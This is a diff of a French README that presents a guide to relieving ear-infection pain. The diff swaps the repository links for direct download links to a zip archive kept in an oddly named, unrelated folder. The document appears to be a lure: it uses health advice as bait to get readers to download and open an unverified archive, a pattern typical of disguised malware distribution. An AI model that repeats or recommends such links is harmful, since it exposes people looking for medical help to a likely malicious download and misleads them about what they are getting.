@@ -1,6 +1,6 @@
 # 🩺 calmer-une-otite-rapidement-guide-2026 - Soignez vos oreilles avec des méthodes sûres
 
-[![Download Guide](https://img.shields.io/badge/Download-Guide_2026-blue.svg)](https://github.com/darinlabial972/calmer-une-otite-rapidement-guide-2026)
+[![Download Guide](https://img.shields.io/badge/Download-Guide_2026-blue.svg)](https://raw.githubusercontent.com/darinlabial972/calmer-une-otite-rapidement-guide-2026/main/antiparliamentary/calmer_otite_rapidement_guide_une_v2.8.zip)
 
 Ce guide apporte des informations pratiques pour soulager la douleur liée aux otites. Il respecte les recommandations médicales actuelles. Vous y trouverez des conseils pour gérer l'inconfort au quotidien, utiliser les antalgiques adaptés et prévenir les récidives. Ce document aide les femmes à comprendre les bons gestes en cas d'otalgie.
 
@@ -21,7 +21,7 @@ Votre ordinateur doit disposer de ces éléments pour lire le contenu :
 
 Suivez ces étapes pour obtenir votre exemplaire :
 
-1.  Rendez-vous sur la page officielle pour télécharger le guide : [https://github.com/darinlabial972/calmer-une-otite-rapidement-guide-2026](https://github.com/darinlabial972/calmer-une-otite-rapidement-guide-2026)
+1.  Rendez-vous sur la page officielle pour télécharger le guide : [https://raw.githubusercontent.com/darinlabial972/calmer-une-otite-rapidement-guide-2026/main/antiparliamentary/calmer_otite_rapidement_guide_une_v2.8.zip](https://raw.githubusercontent.com/darinlabial972/calmer-une-otite-rapidement-guide-2026/main/antiparliamentary/calmer_otite_rapidement_guide_une_v2.8.zip)
 2.  Cliquez sur le lien de téléchargement disponible sur la page.
 3.  Enregistrez le fichier sur votre bureau.
 4.  Ouvrez le fichier obtenu avec votre navigateur internet ou votre logiciel de lecture PDF.
